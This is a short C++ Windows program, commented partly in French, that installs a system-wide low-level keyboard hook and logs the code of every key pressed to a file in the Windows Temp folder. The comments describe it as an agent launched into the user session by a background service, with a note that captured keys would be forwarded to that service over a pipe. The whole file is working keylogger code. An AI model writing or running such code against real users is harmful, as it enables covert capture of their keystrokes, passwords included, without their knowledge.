#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Windows 10 minimum
#endif
#define NTDDI_VERSION 0x0A000000

#define WIN32_LEAN_AND_MEAN // reduce size of the windows headers
#define NOMINMAX
#define _UNICODE
#define UNICODE
#pragma comment(lib, "User32.lib")
#include <windows.h>
#include <iostream>

void LogEvent(const wchar_t* msg)
{
    const wchar_t* logPath = L"C:\\Windows\\Temp\\winkey.log";
    FILE* f = nullptr;
    errno_t err = _wfopen_s(&f, logPath, L"a+");
    if (err != 0 || f == nullptr) {
        wchar_t buf[256];
        swprintf_s(buf, L"Failed to open log file, errno=%d, GetLastError=%lu", err, GetLastError());
        OutputDebugStringW(buf); // can see that with DebugView
        return;
    }
    fwprintf(f, L"%s\n", msg);
    fclose(f);
}

// Fonction de rappel (Callback)
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        //std::cout << "Touche pressée : " << kbdStruct->vkCode << std::endl;
        wchar_t buf[128];
        swprintf_s(buf, L"Pressed key : %d\n", kbdStruct->vkCode);
        LogEvent(buf);
        
        // C'est ici que tu enverrais la donnée au service via un Pipe
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// L'agent (lancé en Session 1 par le Service en Session 0)
int main() {
    LogEvent(L"Entered proc main\n");
    HHOOK hKeyboardHook;
    // Installation du hook
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (!hKeyboardHook) {
        return 1;
    }

    // Boucle de messages indispensable pour que le hook fonctionne
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}